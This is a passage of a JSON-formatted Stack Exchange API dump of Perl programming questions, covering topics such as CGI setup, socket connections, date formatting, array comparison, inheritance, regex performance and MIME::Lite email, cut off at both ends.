cgi-bin.  I can't get a clear answer whether I name the file .pl or .cgi and when I put it in the cgi-bin I am getting a server error.  I also have my permissions set to 777, so that shouldn't be the problem.</p>\n\n<p>Please help!  I just want to understand the how to get the very basic program working such as the one below.  Thanks in advance!</p>\n\n<pre><code>    #!/usr/bin/perl\n    require(\"cgi-lib.pl\");\n    print &amp;PrintHeader;\n\n    print \"&lt;html&gt;\";\n    print \"&lt;head&gt;&lt;title&gt;Hello world!&lt;/title&gt;&lt;/head&gt;\";\n    print \"&lt;body&gt;\";\n    print \"&lt;p&gt;Hello world!&lt;/p&gt;\";\n    print \"&lt;/body&gt;\";\n    print \"&lt;/html&gt;\";\n</code></pre>\n"},{"tags":["php","perl","sockets"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":52,"score":1,"question_id":13201295,"title":"perl script sometime fails to create socket connection when called from php","body":"<p>I am trying to make a webpage from where people can run <a href=\"http://theory.stanford.edu/~aiken/moss/\" rel=\"nofollow\">moss</a> and check similarities in source code files.<br>\nFor that I'm uploading the files via php and calling the <a href=\"http://moss.stanford.edu/general/scripts/mossnet\" rel=\"nofollow\">moss script</a> with those files as arguments using 'exec' in php, and dumping the output in a separate text file. The code works fine sometimes but sometimes it just stops after uploading the files. <br> Following is a snippet from the script</p>\n\n<pre><code>$server = 'moss.stanford.edu';\n$port = '7690';\n.\n.    \n$sock = new IO::Socket::INET (\n                                  PeerAddr =&gt; $server,\n                                  PeerPort =&gt; $port,\n                                  Proto =&gt; 'tcp',\n                                 );\ndie \"Could not connect to server $server: $!\\n\" unless $sock;\n$sock-&gt;autoflush(1);\n.\n.\n</code></pre>\n\n<p>it is unable to create connection, and doesn't proceed beyond the fourth line in this snippet - '<em>die \"Could not connect to server $server: $!\\n\" unless $sock;</em>'\n<br><br>\nthis doesn't happen all the time but, sometimes it works just fine and sometimes it doesn't.<br>\nBut when I login to my webhost (which is btw godaddy), via ssh and execute the script in terminal with the same arguments, it always works!<br><br>\nCan someone please help me out with this, what's going wrong on the server sometimes that the script dies when executed through browser?</p>\n"},{"tags":["perl","datetime","duration","datediff"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":81,"score":0,"question_id":13199646,"title":"Perl: how to pretty-print time difference (duration)","body":"<p>How do I pretty print time duration in perl?</p>\n\n<p>The only thing I could come up with so far is</p>\n\n<pre><code>my $interval = 1351521657387 - 1351515910623; # milliseconds\nmy $duration = DateTime::Duration-&gt;new(\n    seconds =&gt; POSIX::floor($interval/1000) ,\n    nanoseconds  =&gt; 1000000 * ($interval % 1000),\n);\nmy $df = DateTime::Format::Duration-&gt;new(\n    pattern =&gt; '%Y years, %m months, %e days, ' .\n               '%H hours, %M minutes, %S seconds, %N nanoseconds',\n    normalize =&gt; 1,\n);\nprint $df-&gt;format_duration($duration);\n</code></pre>\n\n<p>which results in</p>\n\n<pre><code>0 years, 00 months, 0 days, 01 hours, 35 minutes, 46 seconds, 764000000 nanoseconds\n</code></pre>\n\n<p>This is no good for me for the following reasons:</p>\n\n<ol>\n<li>I don't want to see \"<em>0 years</em>\" (space waste) &amp;c and I don't want to remove \"<em>%Y years</em>\" from the <strong>pattern</strong> (what if I do need years next time?)</li>\n<li>I know in advance that my precision is only milliseconds, I don't want to see the 6 zeros in the nanoseconds part.</li>\n<li>I care about prettiness/compactness/human readability much more than about precision/machine readability. I.e., I want to see something like \"<em>1.2 years</em>\" or \"<em>3.22 months</em>\" or \"<em>7.88 days</em>\" or \"<em>5.7 hours</em>\" or \"<em>75.5 minutes</em>\" (or \"<em>1.26 hours</em>, whatever looks better to you) or \"<em>24.7 seconds</em>\" or \"<em>133.7 milliseconds</em>\" &amp;c (similar to how <strong>R</strong> prints <a href=\"http://stat.ethz.ch/R-manual/R-devel/library/base/html/difftime.html\" rel=\"nofollow\">difftime</a>)</li>\n</ol>\n"}]}
{"total":22324,"page":3,"pagesize":100,"questions":[{"tags":["arrays","perl"],"answer_count":1,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":172,"score":3,"question_id":13175603,"title":"How to do fast comparison of arrays in perl","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/1609467/in-perl-is-there-a-built-in-way-to-compare-two-arrays-for-equality\">In Perl, is there a built in way to compare two arrays for equality?</a>  </p>\n</blockquote>\n\n\n\n<p>I need to compare arrays with a function that should return:</p>\n\n<ul>\n<li>true if all elements are equal when compared pairwise</li>\n<li>true if all elements are equal <strong>or the element in the first array is undefined</strong> when compared pairwise</li>\n<li>false in all other cases</li>\n</ul>\n\n<p>in other words, if the sub is called \"comp\":</p>\n\n<pre><code>@a = ('a', 'b', undef, 'c');\n@b = ('a', 'b', 'f', 'c');\ncomp(@a, @b); # should return true\ncomp(@b, @a); # should return false\n\n@a = ('a', 'b');\n@b = ('a', 'b', 'f', 'c');\ncomp(@a, @b); # should return true\n</code></pre>\n\n<p>the obvious solution would be to do pairwise compares between the two arrays, but I'd like it to be faster than that, as the comparisons are run multiple times over a large set of arrays, the and the arrays may have many elements.  </p>\n\n<p>On the other hand, the contents of the arrays to be compared (i.e.: all the possible @b's) is pre-determined and does not change. The elements of the arrays do not have a fixed length, and there is no guarantee as to what chars they might contain (tabs, commas, you name it).</p>\n\n<p>Is there a faster way to do this than pairwise comparison? Smart match won't cut it, as it returns true if <em>all</em> elements are equal (an therefore not if one is undef).</p>\n\n<p>Could packing and doing bitwise comparisons be a strategy? It looks promising when I browse the docs for pack/unpack and vec, but I'm somewhat out of my depth there.</p>\n\n<p>Thanks.</p>\n"},{"tags":["perl"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":13200196,"title":"Sorting an Input List","body":"<p>I have an input list that is being provided by a system that tracks metrics.  I need to sort it in order to remove usage data that is below a given threshold and I really have no idea how to approach it.  The data that is fed to me should look similar to this:</p>\n\n<pre><code>ID                    Usage                  Estimated Cost\n------------------------------------------------------------------\nUniversity Name       260000                 1600.00\n</code></pre>\n\n<p>The first field will be a name, and the following two fields will be integer values.\nI was thinking about trying to create list of lists, but there is probably an easier way.\nHow would I go about removing just getting the 3 fields and sorting them by the usage value?</p>\n"},{"tags":["perl","object","inheritance"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":55,"score":1,"question_id":13198361,"title":"Reference sub class package name in Perl","body":"<p>I have the following.</p>\n\n<pre><code>package A;\n\nsub new {\n  my ($class) = @_;\n  my $self = { };\n  bless $self, $class;\n  return($self);\n}\n\nsub run() {\n  die \"Task: \",__PACKAGE__,  \"requires a run method\";\n}\n\npackage B;\nuse A;\nour @ISA = qw(A);\nsub new {\n  my ($class) = @_;\n  my $self = { };\n  bless $self, $class;\n  return($self);\n}\n\npackage C;\nuse A;\nmy @Tasks;\n\nsub new {\n  my ($class) = @_;\n  my $self = { };\n  bless $self, $class;\n  return($self);\n}\n\nsub add{\n   my($self,$tempTask) = @_ ;\n   push(@Tasks,$tempTask);\n   $arraysize = @Tasks;\n}\n\nsub execute{\n    foreach my $obj (@Tasks)\n    {\n            $obj-&gt;run();\n    }\n}\n1;\n</code></pre>\n\n<p>Script</p>\n\n<pre><code>#!/usr/local/bin/perl\nuse strict;\nuse C;\nuse B;\n\nmy $tb = new C();\nmy $task = new B();\n$tb-&gt;add($task);\n$tb-&gt;execute();\n</code></pre>\n\n<p>Package B doesn't have a run method so it defaults to the Package A run method which is what I want. At this point I want it to print out the name of Package B (there will be many different packages inheriting Package A, but it doesnt.</p>\n\n<p>Currently it prints out Package A using the <code>__PACKAGE__</code> variable.</p>\n\n<p>Any help?</p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":49,"score":2,"question_id":13198010,"title":"How to handle input files uniformly","body":"<p>I have a program expecting input from stdin, OR from a mix of .log and .log.gz files. Here are the three types of calls I want the program to handle:</p>\n\n<pre><code>cat input.log | prog\nprog &lt; input.log\nprog input.log input.log.gz\n</code></pre>\n\n<p>The program considers all input files as one. I was hoping to capitalize on ARGV to process all input uniformly:</p>\n\n<pre><code>while (&lt;&gt;) {\n# process input\n}\n</code></pre>\n\n<p>My goal is to process gz files in the same loop. How can this be done? I want to know how messy it is. If it is too bad I will handle gz separately.</p>\n\n<p>I can only use core modules with Perl 5.8.8. </p>\n"},{"tags":["perl","ant","jenkins"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":87,"score":0,"question_id":13077012,"title":"Jenkins launches a Perl script that has ANT in it, but ANT is unable to read a .properties file","body":"<p>Previously I had Jenkins launching a perl build script that at some point during the script would open up a .bat file that launched our ANT jobs. I'm trying to consolidate and get rid of the .bat files and launch ANT straight from the perl script. I have been able to successfully do this, but the problem is the .properties file that the ANT script looked at for it's variables is no longer being imported correctly as it was when the .bat file launched the ANT script. </p>\n\n<p>Currently I'm just called an \"Exec(\"ant -buildfile C:\\project\\buildfile.xml\") and that fires off the ant, but it comes back with an error, \"Cannot find ${script.dir}/barbuildfile.xml\". The \"script.dir\" is being defined in a .properties file that is located in the same directory as the build files. This works perfectly when it's launched by the .bat file, but it fails whenever it's called through Perl. Any reason why? Or better yet, how to fix it?</p>\n\n<p>I have also tried forcing it to load the properties file by launching. \"Exec(\"ant -buildfile C:\\project\\buildfile.xml -Dpropertyfile=C:\\project\\build.properties\")\" and receive the same error. </p>\n\n<p>Edit:\nThis is the.bat file</p>\n\n<pre><code>set project.name=%1\n\nset environment=%2\n\nset version.tag=%3\n\nset build.list=%4\n\nset JAVA_HOME=C:\\ProgramFiles\\IBM\\jdk\n\nset ANT_HOME=C:\\ProgramFiles\\IBM\\IMShared\\plugins\\org.apache.ant_1.7.1.v20100518-1145\n\nset PATH=C:\\Program Files (x86)\\IBM\\IMShared\\plugins\\org.apache.ant_1.7.1.v20100518-1145\\bin\n\n\nCALL ant -buildfile C:\\scripts\\build_service.xml\n</code></pre>\n\n<p>Perl Script:</p>\n\n<pre><code>system(\"set project.name=$project\");\nsystem(\"set environment=$environment\");\nsystem(\"set version.tag=$version\");\nsystem(\"set build.list=$service\");\nsystem(\"set JAVA_HOME=C:\\ProgramFiles\\IBM\\jdk\");\nsystem(\"set ANT_HOME=C:\\ProgramFiles\\IBM\\IMShared\\plugins\\org.apache.ant_1.7.1.v20100518-1145\");\nsystem(\"set PATH=C:\\Program Files (x86)\\IBM\\IMShared\\plugins\\org.apache.ant_1.7.1.v20100518-1145\\bin\");\nexec(\"CALL ant -buildfile C:\\\\scripts\\\\build_service.xml\n</code></pre>\n"},{"tags":["perl","runtime","try-catch"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":55,"score":1,"question_id":13192476,"title":"Perl catch runtime error","body":"<p>I am writing a perl script to open a textfile and perform some transformations on it. script is throwing an error saying \"No such file or directory exists\" whenever text file is unavailable.</p>\n\n<p>I want to catch that error and create textfile then.</p>\n\n<pre><code>while (&lt;&gt;) {       #i am passing filename from the batch file\n    #some task\n}\n# if the above while loop fails it throws no such file or directory exists error. I want to  catch it and do some other task.\n</code></pre>\n"},{"tags":["perl"],"answer_count":6,"favorite_count":0,"up_vote_count":9,"down_vote_count":0,"view_count":159,"score":9,"question_id":13187239,"title":"Summing a column of numbers in a text file using Perl","body":"<p>Ok, so I'm very new to Perl. I have a text file and in the file there are 4 columns of data(date, time, size of files, files). I need to create a small script that can open the file and get the average size of the files. I've read so much online, but I still can't figure out how to do it. This is what I have so far, but I'm not sure if I'm even close to doing this correctly.</p>\n\n<pre><code>#!/usr/bin/perl\n\nopen FILE, \"files.txt\";\n#@array = File;\n\nwhile(FILE){\n    #chomp;\n\n    ($date, $time, $numbers, $type) = split(/ /,&lt;FILE&gt;);\n\n    $total += $numbers;\n\n}\nprint\"the total is $total\\n\";\n</code></pre>\n\n<p>This is how the data looks in the file. These are just a few of them. I need to get the numbers in the third column. </p>\n\n<pre><code>12/02/2002  12:16 AM              86016 a2p.exe\n10/10/2004  11:33 AM               393 avgfsznew.pl\n11/01/2003  04:42 PM             38124 c2ph.bat\n</code></pre>\n"},{"tags":["perl"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":61,"score":0,"question_id":13193375,"title":"Output is not correct, missing the data after comma","body":"<p>Below is the code which I have written to compare two files. Basically the program is trying to fetch those records which were present in yesterday's report but not present in today's report file.</p>\n\n<p><strong>Example</strong></p>\n\n<p><strong>File1.txt</strong></p>\n\n<pre><code>1111,1\n2222,2\n3333,3\n4444,4\n</code></pre>\n\n<p><strong>File2.txt</strong></p>\n\n<pre><code>1111,1\n5555,5\n6666,6\n3333,3\n7777,7\n</code></pre>\n\n<p><strong>Run</strong> </p>\n\n<pre><code>perl program.plx File1.txt File2.txt\n</code></pre>\n\n<p><strong>Output should be</strong></p>\n\n<pre><code>2222,2\n4444,4\n</code></pre>\n\n<p><strong>But I'm getting</strong></p>\n\n<pre><code>2222\n4444\n</code></pre>\n\n<p>i.e. I'm missing the data after comma. I think there is some problem in regex part. Kindly let me know where I'm doing wrong. Thanks :)</p>\n\n<pre><code>    code deleted due to privacy reasons.\n</code></pre>\n"},{"tags":["perl","escaping","xml-simple"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":74,"score":1,"question_id":13195155,"title":"Using a : in a variable name in perl","body":"<p>I'm really new to perl and have an issue where I load in XML using XML::Simple and I have the tag names as hash names. I want to get at the hash stored with the name \"xsd:schema\" but obviously $xsd:schema doesn't work. I've spent ages googling it and cant find how to do it.</p>\n\n<p>How do I get at that hash so I can find out the key values?</p>\n\n<p>Edit:</p>\n\n<p>Sorry I didn't explain myself very well. I want to find out the keys and values of those keys in a hash several levels deep but the name xsd:schema is causing a syntax error:</p>\n\n<pre><code>foreach my $attributes (keys %{ $data{$xsd:schema}{$xsd:element}}){\n    print \"$attributes : ${$data}{$xsd:schema}{$xsd:element}{$attributes}\\n\";\n}\n</code></pre>\n\n<p>Edit 2:\nHere is how I did it.</p>\n\n<pre><code>$schemaData = $data-&gt;{'xsd:schema'}-&gt;{'xsd:element'}-&gt;{'xsd:complexType'}-&gt;{'xsd:sequence'}-&gt;{'xsd:element'}-&gt;{'xsd:complexType'}-&gt;{'xsd:sequence'}-&gt;{'xsd:element'};\n\nprint Dumper($schemaData);\n\nforeach my $fieldName (keys %{ $schemaData}){\n\n    $fieldType =  $schemaData-&gt;{$fieldName}-&gt;{'type'};\n    print \"$fieldType\\n\";\n}\n</code></pre>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":65,"score":2,"question_id":13196927,"title":"why does the print command execute after the STDIN although called before it?","body":"<p>I have a simple program </p>\n\n<pre><code>use strict;\nuse warnings;\n\nprint \"Enter a number:\\n\";\nmy $number1 = &lt;STDIN&gt;;\nchomp $number1;\nprint \"Enter another number:\\n\";\nmy $number2 = &lt;STDIN&gt;;\nchomp $number2;\nif ( $number2 == 0 ) {\n    print \"error: cnt divide by zero\\n\";\n}\nelsif ( ( $number1 == 0 ) or ( $number2 == 1 )) {\n    print \"$number1\\n\";\n}\nelse {\n    my $div = $number1 / $number2;\n    print \"the result is: $div\\n\";\n}\n</code></pre>\n\n<p>but i do not understand why the print(enter a number and enter another number is displayed after the STDIN).i get the following output</p>\n\n<pre><code>[612] perl test.pl\n2\n0\nEnter a number:\nEnter another number:\nerror:cnt divide by zero\n</code></pre>\n"},{"tags":["perl","sed","awk"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":67,"score":1,"question_id":13179818,"title":"Reformatting separated char to couples","body":"<p>Input:</p>\n\n<pre><code>rs001 A C T G C G T T\nrs002 C C T T G G A A\n</code></pre>\n\n<p>out1:</p>\n\n<pre><code>rs001 AC TG CG TT\nrs002 CC TT GG AA\n</code></pre>\n\n<p>out2 :</p>\n\n<pre><code>rs001 1 1 1 2\nrs002 2 2 2 2\n</code></pre>\n\n<p>Ok so basically I want to replace any two similar nucleotides (like AA, CC, TT, or GG) to 2 and any two different (like AT, TA, CG, .. etc) to 1 taking into account that the input should be converted first to out1 then to out2. Also we have so many fields (like 200 columns) in each row, so loops are needed here.</p>\n\n<p>This is what I tried: </p>\n\n<pre><code>cat input | awk '{ for (x = 2; x &lt;= NF; x = x+2) print $x$(x+1) }'\n</code></pre>\n\n<p>Results are so weird, so can anyone please tell me why I can't get out1 ?! What mistakes I did in awk loops ? </p>\n\n<p>Thanks in advance</p>\n"},{"tags":["perl","gunzip"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":19,"score":0,"question_id":13190946,"title":"How to get the modify time of a compressed gz file using perl","body":"<p>I have thousands of gz files, each gz file has one XML file compressed.<br>\nI need to parsing all the files by Perl.<br>\nIt works fine when using following Perl code:</p>\n\n<pre><code>my $fh = IO::Uncompress::Gunzip-&gt;new($file);  \nwhile($_ = &lt;$fh&gt;) {  \n    ...  \n}\n</code></pre>\n\n<p>My question is, is it possible to get the last modify time of the XML file?\nI've tried <code>stat($fh))[9]</code> but always returns the epoch time.</p>\n\n<p>Thanks for your kindly help.</p>\n"},{"tags":["perl","version-control","accurev"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":32,"score":1,"question_id":13196584,"title":"CVS equivilent to $id:$ in Accurev","body":"<p>I am looking for a CVS equivalent to $id:$ in Accurev.</p>\n\n<p>Before you start talking compile-time scripts - my major caveat is that a lot of my stuff is in Perl - so I can't do any of the normal \"compile-time tricks\" - as there really isn't much of any \"compile-time\" stuff.</p>\n\n<p>I don't really want to require external files to define this stuff, as if (god forbid) the external definition files got out-of-sync with the actual scripts, etc...</p>\n\n<p>I know I could always do some sort of compile-time preprocessor on the script files (to rewrite them) - but if there is a <em>cleaner</em> or better-integrated way of doing so (like \"$id:$\"   I'd appreciate anyone ideas).</p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":13183599,"title":"Append a Z at the end of the UTC time","body":"<p>I am using perl, and passing this --></p>\n\n<pre><code>DateTime-&gt;now( time_zone =&gt; 'UTC' )) to the method below\n</code></pre>\n\n<p>and </p>\n\n<pre><code>sub get_datetime{\n    my ($datetime) = @_;\n    my $formatter = new DateTime::Format::Strptime(pattern =&gt; \"%Y-%m-%d %H:%M:%S\",\n                       time_zone =&gt; \"UTC\");\n    return $formatter-&gt;format_datetime($datetime);\n}\n</code></pre>\n\n<p>and I want to display the time like 2012-10-10 10:00:01Z</p>\n\n<p>how can I append the Z at the end for the UTC times? I tried \npattern => \"%Y-%m-%d %H:%M:%S%Z\"  but thats not compiling.</p>\n"},{"tags":["python","regex","perl"],"answer_count":2,"favorite_count":0,"up_vote_count":9,"down_vote_count":0,"view_count":199,"score":9,"question_id":13179030,"title":"Why this Python regexp is so slow to (not) match?","body":"<p>The following code is incredibly slow:</p>\n\n<pre><code>import re\nre.match( '([a]+)+c', 'a' * 30 + 'b' )\n</code></pre>\n\n<p>and it get worst if you replace 30 with a larger constant.</p>\n\n<p>I suspect that the parsing ambiguity due to the consecutive + is the culprit, but I'm not very expert in regexp parsing and matching. Is this a bug of the Python regexp engine, or any reasonable implementation will do the same?</p>\n\n<p>I'm not a Perl expert, but the following returns quite fast</p>\n\n<pre><code>perl -e '$s=\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaab\"; print \"ok\\n\" if $s =~ m/([a]+)+c/;'\n</code></pre>\n\n<p>and increasing the number of 'a' does not alter substantially the execution speed.</p>\n"},{"tags":["perl","script","system","infinite-loop","init.d"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":65,"score":1,"question_id":13183653,"title":"Odd behavior with Perl system() command","body":"<p>Note that I'm aware that this is probably not the best or most optimal way to do this but I've run into this somewhere before and I'm curious as to the answer.</p>\n\n<p>I have a perl script that is called from an init that runs and occasionally dies. To quickly debug this, I put together a quick wrapper perl script that basically consists of</p>\n\n<pre><code>#$path set from library call.    \nwhile(1){\n  system(\"$path/command.pl &gt;&gt;/var/log/outlog 2&gt;&amp;1\");\n  sleep 30; #Added this one later. See below...\n}\n</code></pre>\n\n<p>Fire this up from the command line and it runs fine and as expected. command.pl is called and the script basically halts there until the child process dies then goes around again.</p>\n\n<p>However, when called from a start script (actually via start-stop-daemon), the system command returns immediately, leaving command.pl running. Then it goes around for another go. And again and again. (This was not fun without the sleep command.). ps reveals the parent of (the many) command.pl to be 1 rather than the id of the wrapper script (which it is when I run from the command line).</p>\n\n<p>Anyone know what's occurring?</p>\n"},{"tags":["perl","variable-assignment","dynamic-variables"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":48,"score":2,"question_id":13194759,"title":"Perl variable value as another variable name","body":"<p>I have a perl script (abc.pl) and 2 config files (one var.pl and one config.txt)</p>\n\n<p>Now</p>\n\n<p>in var.pl</p>\n\n<pre><code>$admin_userid = \"admin\";\n$guest_userid = \"guest\";\n</code></pre>\n\n<p>in config.txt - this has the value of user - can be either admin or guest</p>\n\n<pre><code>user=admin/guest\n</code></pre>\n\n<p>in abc.pl</p>\n\n<pre><code>require var.pl\n\n$get_user = admin or guest (get this value from config.txt)\n**$myfinal_userid = ??**\n</code></pre>\n\n<p>I want the value of myfinal_user_id as admin if user in config.txt is admin and guest if it is guest.</p>\n\n<p>i.e. based on $get_user's value I want the value of userid - ${$get_user}.\"_userid\"\n eg: if config.txt has user=admin, the $get_user = admin and I want $myfinal_userid = $admin_userid. similarly for guest. This has to be dynamic.</p>\n\n<p>Finally what I want is, know the user from config.txt and based on it, get the userid from var.pl and store that in myfinal_userid.</p>\n\n<p>Let me know how can I achieve this in perl?</p>\n"},{"tags":["perl"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":13194977,"title":"Modules won't load","body":"<p>I have a website framework based on Perl, For some reason links from the site is getting duplicate calls to the same folder name <a href=\"http://www.amichraz.co.il/contactUs\" rel=\"nofollow\">Example</a></p>\n\n<p>Any ideas how to solve this kind of a problem when I do have zero experience with Perl.</p>\n\n<p>Thanks for any help given</p>\n"},{"tags":["perl","command-line"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":49,"score":1,"question_id":13186898,"title":"Using command line to replace text in all files in folder?","body":"<p>I need to replace text in all the files in one of my folders and am using Perl but getting an error.</p>\n\n<p>This is what I am running:</p>\n\n<pre><code>perl -pi.bak -e 's/&lt;START&gt;/&lt;url&gt;&lt;loc&gt;http://www.mysite.com/page//g' *\n</code></pre>\n\n<p>Basically I just need to replace</p>\n\n<pre><code>&lt;START&gt;\n</code></pre>\n\n<p>with this:</p>\n\n<pre><code>&lt;url&gt;&lt;loc&gt;http://www.mysite.com/page/\n</code></pre>\n\n<p>And this is the error I'm getting:</p>\n\n<pre><code>Illegal division by zero at -e line 1, &lt;&gt; line 1.\n</code></pre>\n\n<p>Can someone tell me what I should be doing?  I've also tried several other methods but none seem to be working...  I really need it to be done via command line so that it's faster because there are over ten million lines.  Thanks!</p>\n"},{"tags":["perl"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":74,"score":0,"question_id":13191401,"title":"Perl 2x2 array addition using Subroutines and Reference","body":"<p>My question in Perl is:\nDefine 2x2 arrays using anonymous lists. Pass the arrays to a subroutine and add them together. Return a reference to sum array and print the values from the main part of the program.</p>\n\n<p>My script is:</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse strict;\n\nuse warnings;\n\nmy @array = ([1,2],[4,5]); \n\nmy $refarray = \\@array;\n\nprint sumarray($refarray);\n\nsub sumarray\n\n{\n\n $refarray = shift;\n\n foreach (@{$refarray})\n\n {\n\n  $refarray = ($refarray[0]-&gt;[0]+$refarray[1]-&gt;[0],$refarray[0]-&gt;[1]+$refarray[1]-&gt;[1]);\n\n }\n\n return $refarray;\n\n}\n</code></pre>\n\n<p>Where am I going wrong? Please help. Thanks in advance. </p>\n\n<pre><code>I am getting the output as 0.\n</code></pre>\n\n<p>If I use <code>use strict;</code> and <code>use warnings;</code> I will get the error message as</p>\n\n<pre><code>Global symbol \"@refarray\" requires explicit package name at line 23.\nGlobal symbol \"@refarray\" requires explicit package name at line 23.\nGlobal symbol \"@refarray\" requires explicit package name at line 23.\nGlobal symbol \"@refarray\" requires explicit package name at line 23.\nExecution aborted due to compilation errors.\n</code></pre>\n"},{"tags":["perl","wikipedia","lwp"],"answer_count":5,"favorite_count":0,"up_vote_count":6,"down_vote_count":0,"view_count":1924,"score":6,"question_id":24546,"title":"Why can't I fetch wikipedia pages with LWP::Simple?","body":"<p>I'm trying to fetch Wikipedia pages using <a href=\"http://search.cpan.org/dist/libwww-perl\" rel=\"nofollow\">LWP::Simple</a>, but they're not coming back. This code:</p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\nuse LWP::Simple;\n\nprint get(\"http://en.wikipedia.org/wiki/Stack_overflow\");\n</code></pre>\n\n<p>doesn't print anything. But if I use some other webpage, say <code>http://www.google.com</code>, it works fine. </p>\n\n<p>Is there some other name that I should be using to refer to Wikipedia pages? </p>\n\n<p>What could be going on here?</p>\n"},{"tags":["perl","dbix-class"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":13180997,"title":"Create DBIx ResultSet using column aliases","body":"<p>I have started to use DBIx::Class and I really like it for the most part but what is really starting to annoy me is the column alias does not seem to work fully.</p>\n\n<p>Eg. Suppose I have this table definition:</p>\n\n<pre><code>#TestClass.pm\n\nuse strict;\nuse warnings;\n\npackage Database::Schema::Result::TestClass;\n\nuse base qw/DBIx::Class::Core/;\n\n__PACKAGE__-&gt;table(\"TEST_TABLE\");\n__PACKAGE__-&gt;add_column(\"ID\")\n__PACKAGE__-&gt;add_columns(NAME =&gt; {accessor =&gt; \"name\"},\n                         VALUE =&gt; {accessor =&gt; \"value\"}\n                         );\n</code></pre>\n\n<p>And then I try to create a new row as follows:</p>\n\n<pre><code> $schema-&gt;resultset(\"TestClass\")-&gt;create(name =&gt; \"test\", value =&gt; \"value\");\n</code></pre>\n\n<p>The above will say: \nDBIx::Class::ResultSet::create(): No such column name on Database::Schema::Result::TestClass</p>\n\n<p>However the following works fine:</p>\n\n<pre><code> $schema-&gt;resultset(\"TestClass\")-&gt;create(NAME =&gt; \"test\", VALUE =&gt; \"value\");\n</code></pre>\n\n<p>If later on I have TestClass object and try to access its columns as such:</p>\n\n<pre><code> $object-&gt;NAME;\n</code></pre>\n\n<p>I get Can't locate object method \"NAME\" via package \"Database::Schema::Result::TestClass\"</p>\n\n<p>but this is ok:</p>\n\n<pre><code> $object-&gt;name\n</code></pre>\n\n<p>I would expect to be able to create the object using the accessor I provided the column and for creation of the object and accessing the columns to be consistent but this does not seem to be the case. Can anyone explain why this is?</p>\n"},{"tags":["python","perl","uml","sequence-diagram"],"answer_count":2,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":92,"score":3,"question_id":13136247,"title":"generate uml sequence diagrams with python or perl","body":"<p>I have some text which I will process to generate a <strong>uml sequence diagram</strong> image. I can process the text in <code>python</code> or <code>perl</code> into a format of an existing 'text to uml' tools but I'm trying to eliminate that extra step and give the image output directly from the python/perl script.</p>\n\n<p>Are there any python or perl packages/modules I can use?</p>\n"},{"tags":["javascript","perl","rest"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":587,"score":1,"question_id":6009457,"title":"Rest api authentication in javascript","body":"<p>I am trying to use a REST api with JavaScript and can't seem to get it to work. I have a Perl equivalent which is as follows: </p>\n\n<pre><code>my $req = HTTP::Request-&gt;new(POST =&gt; 'https://someurl');\n$req-&gt;content_type('application/xml');\n$req-&gt;headers(Accept =&gt; 'application/xml; charset=utf-8');\n$req-&gt;authorization_basic('username','password');\n$req-&gt;content($body);\n</code></pre>\n\n<p>This is the request. How do I do this in JavaScript, I looked online and couldn't find anything obvious for syntax. </p>\n"},{"tags":["perl","gmail","email-attachments"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":106,"score":0,"question_id":13034327,"title":"Send email to gmail with inline images with MIME::LITE","body":"<p>I need send a email to gmail with some inline images.</p>\n\n<p>I use perl and MIME:LITE, but Gmail show my image as Attachment, not inline.</p>\n\n<p>What's the problem? </p>\n\n<p>This is my code,</p>\n\n<pre><code>use MIME::Lite;\n\nmy $texto = '&lt;html&gt;&lt;body&gt;hola &lt;img src=\"cid:image\" /&gt; adios &lt;/body&gt;&lt;/html&gt;';\n\n#\nmy $msg = MIME::Lite-&gt;new(\n    Date            =&gt; \"Xxx, 22 Oct 2012 17:45:00 CET\",\n    From            =&gt; \"pruebachunga@aqui.com\",\n    To              =&gt; 'chimpun@forum.chimpun',\n    Subject         =&gt; \"En un lugar de la mancha\",\n    'Message-ID'    =&gt; '123456789012345656789@8888888888888ldkf',\n    Type            =&gt;'multipart/related'\n);\n\n$msg-&gt;attach(\n    Type =&gt; 'text/html',\n    Data =&gt; $texto,\n    Encoding =&gt; 'quoted-printable'\n);\n\n$msg-&gt;attach(\n    Encoding =&gt; 'base64',\n    Type =&gt; 'image/png',\n    Path     =&gt; \"image.png\",\n    Id =&gt; \"image\"\n);\n\n$msg-&gt;scrub(['x-mailer', 'Content-Disposition']);\n\nprint $msg-&gt;as_string;\n</code></pre>\n\n<p>The result is this email (I strip image secction)</p>\n\n<pre><code>Content-Transfer-Encoding: binary\nContent-Type: multipart/related; boundary=\"_----------=_135100636840600\"\nMIME-Version: 1.0\nDate: 